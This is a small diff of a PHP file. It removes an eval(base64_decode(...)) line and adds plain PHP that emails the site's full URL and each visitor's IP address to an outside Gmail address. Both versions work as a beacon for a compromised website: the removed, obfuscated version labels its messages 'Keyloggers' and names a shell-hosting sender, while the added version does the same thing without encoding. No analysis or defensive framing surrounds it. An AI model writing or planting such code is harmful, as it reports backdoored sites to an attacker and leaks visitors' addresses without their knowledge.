@@ -1,3 +1,6 @@
 <?php
-eval(base64_decode('PD9waHAKJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokcmE0NCA9IHJhbmQoMSwgOTk5OTkpOwokc3Viajk4ID0gIuKcqiBLZXlsb2dnZXJzIC0kaXAiOwokZW1haWwgPSAidXNlcjU0NDg3MjE1QGdtYWlsLmNvbSI7CiRmcm9tID0gIkZyb206IEZpcmFzIERyaXMgQm90IFYwLjkgPG5vcmVwbHlARmlyYXNEcmlzVjlzaGVsbHMuY29tPiI7CiRhNDUgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJGI3NSA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKJG0yMiA9ICRpcCAuICIiOwokbXNnODg3MyA9ICIkYTQ1ICRiNzUgJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOwo/Pg=='));
+$tujuanmail = 'user54487215@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "Contact Me", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
